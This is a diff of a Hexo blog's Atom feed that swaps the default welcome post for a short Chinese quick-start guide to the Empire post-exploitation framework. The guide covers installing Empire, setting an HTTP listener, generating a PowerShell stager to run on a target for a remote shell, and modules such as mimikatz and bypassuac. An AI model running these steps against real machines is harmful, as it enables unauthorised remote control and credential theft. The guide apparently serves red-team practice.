@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-08-02T15:56:56.000Z</updated>
+  <updated>2017-08-17T15:34:37.000Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -16,26 +16,42 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>Hello World</title>
-    <link href="http://yoursite.com/2017/08/02/hello-world/"/>
-    <id>http://yoursite.com/2017/08/02/hello-world/</id>
-    <published>2017-08-02T15:56:56.000Z</published>
-    <updated>2017-08-02T15:56:56.000Z</updated>
+    <title>Empire 速食指南</title>
+    <link href="http://yoursite.com/2017/08/17/test/"/>
+    <id>http://yoursite.com/2017/08/17/test/</id>
+    <published>2017-08-17T14:51:01.000Z</published>
+    <updated>2017-08-17T15:34:37.000Z</updated>
     
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+    <content type="html"><![CDATA[<h4 id="0x00-install"><a href="#0x00-install" class="headerlink" title="0x00 install"></a>0x00 install</h4><pre><code>git clone https://github.com/EmpireProject/Empire.git
+./setup/install.sh
+</code></pre><h4 id="0x01-quick-start"><a href="#0x01-quick-start" class="headerlink" title="0x01 quick start"></a>0x01 quick start</h4><p>安装完成之后<code>./empire</code>即可运行Empire<br>建立一个监听:</p>
+<pre><code>listeners
+uselistener http
+set Name Empire
+set Host http://192.168.2.131:1080
+execute
+</code></pre><p>再返回主菜单(main)生成stager:</p>
+<pre><code>usestager windows/dll
+set Listener Empire
+execute
+launcher powershell Empire
+</code></pre><p>将生成的powershell命令在目标机器上执行即可拿到一个shell,<code>agents</code>命令可查看上线主机,<code>interact NAME</code>可以获得一个交互的shell</p>
+<h4 id="0x02-常用模块"><a href="#0x02-常用模块" class="headerlink" title="0x02 常用模块"></a>0x02 常用模块</h4><p>你懂的</p>
+<pre><code>mimikatz
+bypassuac
+</code></pre><p>上传下载</p>
+<pre><code>download
+upload
+</code></pre><p>导入执行powershell:</p>
+<pre><code>scriptimport
+scriptcmd
+</code></pre><p>使用<code>searchmodule</code>可以查看模块的说明,模块比较多,就不一一说明了</p>
+<h3 id="0x03-后话"><a href="#0x03-后话" class="headerlink" title="0x03 后话"></a>0x03 后话</h3><p>我觉得我还是喜欢msf多一些</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
+      &lt;h4 id=&quot;0x00-install&quot;&gt;&lt;a href=&quot;#0x00-install&quot; class=&quot;headerlink&quot; title=&quot;0x00 install&quot;&gt;&lt;/a&gt;0x00 install&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;git clone https://gith
     
     </summary>
     
